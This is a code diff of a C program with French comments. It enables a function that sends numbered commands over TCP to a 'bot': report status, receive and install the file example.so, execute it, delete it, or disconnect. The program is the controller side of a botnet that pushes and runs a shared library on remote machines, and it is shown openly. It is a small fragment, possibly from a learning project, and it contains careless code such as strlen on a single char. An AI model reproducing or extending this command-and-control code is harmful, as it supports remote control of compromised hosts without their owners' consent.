@@ -84,7 +84,6 @@ void send_file_tcp(void *s)
     int fd;
     off_t offset;
     int remain_data;
-    
 
     //Read file
     fd = open("example.so", O_RDONLY);
@@ -137,17 +136,42 @@ void send_file_tcp(void *s)
  * param pointeur vers la socket TCP
  * 
  */
- 
-/* void send_commad_tcp(void *s)
+
+void send_commad_tcp(void *s)
 {
     int socket_tcp = *((int *)s);
     char num;
-    printf("Donnez un numéro de commande : \n");
+    char *filename = "example.so";
+    printf("Donnez un numéro de commande (entre 1 et 5): \n");
     //TODO : Retirer le scanf
     scanf("%c", &num);
-    write(socket_tcp, &num, strlen(&num));      
-    send_file_tcp((void *) &socket_tcp);
-}  */
+    switch (num)
+    {
+    case '1': //Demande d'envoyer le statut du bot
+        write(socket_tcp, &num, strlen(&num));
+        break;
+    case '2': //Demande d'installation puis l'envoie du fichier à envoyer
+
+        write(socket_tcp, &num, strlen(&num));
+        send_file_tcp((void *)&socket_tcp);
+        break;
+
+    case '3': //Demande d'exécuter le fichier
+        write(socket_tcp, &num, strlen(&num));
+        write(socket_tcp, filename, strlen(filename));
+        break;
+    case '4': // Demande de supprimer 
+        write(socket_tcp, &num, strlen(&num));
+        write(socket_tcp, filename, strlen(filename));
+        break;
+    case '5' : //Demande de quitter la connexion 
+        write(socket_tcp, &num, strlen(&num));
+        break;
+    default:
+        printf("Erreur\n");
+        exit(-1);
+    }
+}
 
 /**
  * void init_socket()
